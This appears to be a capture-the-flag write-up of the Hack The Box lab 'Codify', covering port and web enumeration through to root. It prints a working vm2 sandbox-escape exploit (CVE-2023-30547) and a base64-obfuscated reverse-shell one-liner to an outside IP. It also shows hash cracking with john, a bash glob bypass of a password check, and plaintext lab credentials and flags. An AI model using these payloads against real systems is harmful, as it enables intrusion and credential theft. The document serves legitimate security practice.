
Target : 10.129.29.69

Started off with the port scan and found : 22, 80, 3000

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Enumerating port : 80

**Subdomain Fuzzing using ffuf**

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.codify.htb" -u http://codify.htb/ -mc 200 `

And got nothing

**Directory bruteforcing using gobuster**

`gobuster dir -u "http://codify.htb:3000/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`

and found a page called "/editor" where we can node.js script. 

![](../Pasted%20image%2020260708160523.png)

But there is certain restrictions is using modules. 

I have searched about the other modules, we can't perform command execution using it.

And the about us page revealed information about the sandbox library used, which is `vm2`

![](../Pasted%20image%2020260708162256.png)

It is affected to `CVE-2023-30547` : https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244

```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('ls -la');
}
`

console.log(vm.run(code));
```

`echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjQxLzEyMzQgMD4mMQ== | base64 -d | bash`

Got Shell as `svc` user

And while exploring in /var/www/contact found a db file "tickets.db"

And got the joshua user hash : `$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`

![](../Pasted%20image%2020260708164238.png)

cracked it using john 

`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

`joshua : spongebob1`

![](../Pasted%20image%2020260708164555.png)

Used ssh to gain access as joshua:

`ssh joshua@codify.htb`

```
joshua@codify:~$ cat user.txt 
2002b90d823bd1b9fa14ceb3483d30c2
```

**Root Escalation:**

```
joshua@codify:~$ sudo -l
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

sudo -l reveals attack path for root escalation.

But unfortunately, we don't have write access to the directory.

``` #mysql-backup.sh
joshua@codify:/opt/scripts$ cat mysql-backup.sh 
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

Every command uses full path, and also to completely run the script, we need root password. 

So, the only option is to hijack the "read" operation.

Actually, there is a logical flaw in the if condition

```
if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```

In Bash, using `==` within `[[ ]]` unquoted can trigger unintended pattern matching or globbing rather than a strict string comparison. Always quote your variables and consider using `"$VAR1" = "$VAR2"` to ensure exact character comparisons. 

Quoting `"$DB_PASS"` and `"$USER_PASS"` forces Bash to treat your inputs as exact strings, preventing the script from evaluating wildcards (like `*` or `?`) as patterns.

We can just use, * to bypass the authentication check and if you notice carefully, mysqldump executes password from the text file /roots/.creds, not from our input. so, we can just monitor the process in other tab, and execute the script again.

`2026/07/08 11:51:59 CMD: UID=0     PID=2545   | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 sys`

`root : kljh12k3jhaskjh12kjh3`

then switched as user root and got the final flag

`root.txt : a3cec4813b89cad1f35f1ddc9b145243`

![](../Pasted%20image%2020260708172430.png)


To be noted:

1.  comparison using == without double quotes, will not check the entire string, it just do patten match, new thing to know.
2. Also, if a process or bash script command executes by a user, it will be logged in the process, but we can't view it in ps aux everytime, but we can monitor it pspy